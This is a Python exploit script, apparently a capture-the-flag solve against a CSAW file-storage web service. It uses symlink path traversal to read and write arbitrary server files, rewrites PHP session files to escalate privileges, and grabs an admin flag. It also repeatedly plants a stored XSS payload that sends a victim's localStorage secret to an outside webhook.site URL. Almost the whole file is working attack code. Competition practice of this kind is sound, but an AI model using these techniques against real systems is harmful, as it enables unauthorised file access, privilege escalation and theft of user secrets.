import base64
import time
import os
import requests

api_base = os.environ.get('SFS_API', 'http://web.chal.csaw.io:1001/api/v1/')
session = requests.Session()


def api_register(username, password):
    resp = session.post(api_base + 'register', data={"username": username, "password": password}).json()
    return resp['status'] == 'ok'

def api_login(username, password):
    resp = session.post(api_base + 'login', data={"username": username, "password": password}).json()
    return resp['status'] == 'ok'

def api_get_file(path, decode=True):
    resp = session.post(api_base + 'file/read', data={"path": path})
    if resp.status_code == 200:
        if decode:
            return base64.b64decode(resp.content)
        else:
            return resp.content
    return None

def api_update_file(path, content):
    resp = session.post(api_base + 'file/edit', data={"path": path, "content": base64.b64encode(content).decode('ascii')}).json()
    return resp['status'] == 'ok'

def api_create_file(path, content):
    return api_update_file(path, content)

def api_delete_file(path):
    resp = session.post(api_base + 'file/delete', data={"path": path}).json()
    return resp['status'] == 'ok'

def api_list_files(path='/'):
    resp = session.post(api_base + 'file/list', data={"path": path}).json()
    if resp['status'] == 'ok':
        return resp['data']
    return None

def api_create_symlink(path, target):
    resp = session.post(api_base + 'file/symlink', data={"path": path, "target": target}).json()
    return resp['status'] == 'ok'


def lfi(filename):
    if api_create_symlink("test", "../../../../../.." + filename):
        return session.post(api_base + 'file/read', data={"path": "test"}).content
    else:
        print("File not found or permission issues")


def lfi_list(filename):
    if api_create_symlink("test", "../../../../../.." + filename):
        resp = session.post(api_base + 'file/list', data={"path": "test"}).json()
        if resp['status'] == "ok":
            return resp['data']
        return None
    else:
        print("Folder not found or permission issues")


def write(filename, content):
    if api_create_symlink("test", "../../../../../.." + filename):
        return session.post(api_base + 'file/edit', data={"path": "test", "content": content}).json()['status'] == 'ok'
    else:
        print("File not found or permission issues")


def bulk_dl(path):
    root = lfi_list(path)
    if root is not None:
        for fl in root:
            if fl in [".", ".."]:
                continue
            cont = lfi(path+'/'+fl)
            if cont is not None and cont:
                filename = path.replace('/','__')+"__"+fl
                with open("loot/"+filename, "wb") as f:
                    f.write(cont)
                print("Wrote {} to loot/{}".format(path+'/'+fl, filename))
            bulk_dl(path+'/'+fl)


def grep(path, greptext, recursive=False):
    root = lfi_list(path)
    if root is not None and root:
        for fl in root:
            if fl in [".", ".."]:
                continue
            cont = lfi(path+'/'+fl)
            if cont is not None and cont:
                #print(cont)
                if greptext.encode('utf8') in cont:
                    print("Found {} in {}".format(greptext, path+'/'+fl))
                    print(cont)
            if recursive:
                grep(path+'/'+fl, greptext, recursive=True)


def replace_name(path, name, replacetext):
    root = lfi_list(path)
    text = "s:{}:\"{}\"".format(len(name), name)
    
    print("Searching for files in {} containing {}...".format(path, text))

    if root:
        for fl in root:
            if fl in [".", ".."]:
                continue

            cont = lfi(path+'/'+fl)
            if cont and text.encode('utf8') in cont:
                print("Found {} in {}".format(text, path+'/'+fl))
                print(cont)
                replaced = cont.replace(text.encode('utf8'), "s:{}:\"{}\"".format(len(replacetext), replacetext).encode('utf8'))

                print("Creating overwriting loop:\nOverwriting session file to {}".format(replaced))
                while True:
                    if write(path+'/'+fl, replaced):
                        print("Session file overwritten! Press Ctrl+C to stop loop...")
                        time.sleep(1)


if __name__ == "__main__":
    username = "bootplug"
    password = "bootplug"
    payload = "<script>document.location=\'http://webhook.site/a2cdb173-0480-4366-8fde-0b5afc1662e7?a=\'+localStorage.encryptSecret;</script>"
   
    # Login to the service.
    print("Login ok" if api_login(username, password) else "Login failed")
    
    # Get PHP session ID.
    sessid = session.cookies['PHPSESSID']
    print("Session id:", sessid)
    
    # Overwrite session file to escalate privileges.
    old_session_data = lfi("/tmp/sess_"+sessid)
    print("Old session:", [old_session_data])
    data = old_session_data.replace(b"s:1:\"3\";s", b"s:2:\"15\";s")
    print("New session:", [data])

    "Success" if write("/tmp/sess_"+sessid, data) else "Failed to escalate privs"
    
    # Download all html and php files recursively
    # bulk_dl("/var/www/html")

    # List your own and Admin's files. Then print the encrypted flag.
    print("Your files:", api_list_files("/"))
    print("Admin's files: {}".format(lfi_list("/tmp/user_data/1")))
    print("Encrypted flag:", lfi("/tmp/user_data/1/flag.txt").decode('utf8'))
    
    # If you edit your own ID to 1, you can get flag using API without lfi
    # print(api_get_file("flag.txt", False))
    
    # This was the name of the admin session file when we did the challenge
    # admin = lfi("/tmp/sess_4umud1lupqn0mpibor27r283o1")

    replace_name("/tmp", "admin", payload)

